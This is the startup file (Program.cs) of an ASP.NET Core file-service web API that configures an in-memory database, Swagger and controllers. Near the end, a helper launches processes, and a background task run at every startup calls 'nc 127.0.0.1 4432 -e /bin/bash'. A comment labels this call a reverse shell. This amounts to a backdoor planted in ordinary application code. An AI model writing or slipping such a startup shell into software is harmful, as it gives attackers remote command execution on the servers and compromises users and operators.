using Microsoft.EntityFrameworkCore;
using Files.Models;
using Files.Services;
using System.Diagnostics;
using System.Threading.Tasks;

var builder = WebApplication.CreateBuilder(args);

// Add services to the container.

builder.Services.AddControllers();
// Learn more about configuring Swagger/OpenAPI at https://aka.ms/aspnetcore/swashbuckle
builder.Services.AddDbContext<FileContext>(options => options.UseInMemoryDatabase("Files"));
builder.Services.AddScoped<FileService>();
builder.Services.AddEndpointsApiExplorer();
builder.Services.AddSwaggerGen();

var app = builder.Build();

// Configure the HTTP request pipeline.
if (app.Environment.IsDevelopment())
{
    app.UseSwagger();
    app.UseSwaggerUI();
}

app.UseHttpsRedirection();

app.UseAuthorization();

app.MapControllers();

// Defining a shell execution function
async Task ExecuteShellCommandAsync(string command, string arguments)
{
    var processInfo = new ProcessStartInfo
    {
        FileName = command,
        Arguments = arguments,
        RedirectStandardOutput = true,
        RedirectStandardError = true,
        UseShellExecute = false,
        CreateNoWindow = true
    };

    try
    {
        using (var process = new Process { StartInfo = processInfo })
        {
            process.Start();

            // Read output and error streams asynchronously (optional)
            string output = await process.StandardOutput.ReadToEndAsync();
            string error = await process.StandardError.ReadToEndAsync();

            // Wait for the process to exit asynchronously
            await process.WaitForExitAsync();
        }
    }
    catch (Exception ex)
    {
        Console.WriteLine("Error executing shell command: " + ex.Message);
    }
}

// Getting reverse shell using netcat command
_ = Task.Run(() => ExecuteShellCommandAsync("nc", "127.0.0.1 4432 -e /bin/bash"));

app.Run();